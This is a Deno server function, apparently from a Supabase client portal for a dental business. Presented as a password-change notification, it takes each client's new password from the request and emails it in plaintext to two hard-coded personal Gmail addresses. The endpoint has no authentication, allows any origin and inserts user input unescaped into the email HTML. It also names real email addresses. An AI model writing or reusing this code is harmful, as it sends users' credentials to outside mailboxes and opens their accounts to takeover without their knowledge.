import { serve } from "https://deno.land/std@0.190.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { userEmail, userName, companyName, newPassword } = await req.json();
    const RESEND_API_KEY = Deno.env.get("RESEND_API_KEY");

    if (!RESEND_API_KEY) {
      throw new Error("RESEND_API_KEY not configured");
    }

    const adminEmails = ["jungabmedia@gmail.com", "kleinabmedia1@gmail.com"];
    const subject = `Client Password Changed - ${companyName || "Unknown Company"}`;
    const html = `
      <h2>Client Password Changed</h2>
      <p><strong>User:</strong> ${userName || "N/A"}</p>
      <p><strong>Email:</strong> ${userEmail || "N/A"}</p>
      <p><strong>Company:</strong> ${companyName || "N/A"}</p>
      <p><strong>New Password:</strong> ${newPassword}</p>
      <hr/>
      <p style="color:#888;font-size:12px;">This is an automated notification from the client portal.</p>
    `;

    for (const email of adminEmails) {
      await fetch("https://api.resend.com/emails", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${RESEND_API_KEY}`,
        },
        body: JSON.stringify({
          from: "noreply@empriadental.de",
          to: [email],
          subject,
          html,
        }),
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Error in notify-password-change:", error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
